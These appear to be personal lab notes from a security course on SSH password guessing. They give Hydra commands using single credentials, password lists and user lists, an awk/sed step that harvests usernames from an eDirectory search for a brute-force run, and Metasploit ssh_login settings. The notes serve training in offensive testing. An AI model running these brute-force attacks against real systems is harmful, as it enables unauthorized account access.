# Password Guessing Notes

this will be done with hydra

```
hydra -t 4 -l root -p sec504 ssh://127.0.0.1
hydra -t 4 -l sec504 -p sec504 ssh://127.0.0.1
```

WITH PASSWORD LIST

```
hydra -t 4 -l sec504 -P passwords.txt ssh://127.0.0.1
```

WITH USERS LIST

```
hydra -t 4 -L users.txt -p sec504 ssh://127.0.0.1
```

eDirectory server, after copying a big list of users and information

```
awk '{print $3}' searchresult.txt
awk '{print $3}' searchresult.txt | sed 's/@.*//' > eusers.txt
hydra -t 4 -L eusers.txt -P passwords.txt ssh://172.30.0.25
```

with metasploit

```
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 127.0.0.1
set username root
set password sec504
set gatherproof false
unset password
set PASS_FILE /home/sec504/labs/passhydra/passwords.txtPASS_FILE => /home/sec504/labs/passhydra/passwords.txt
```
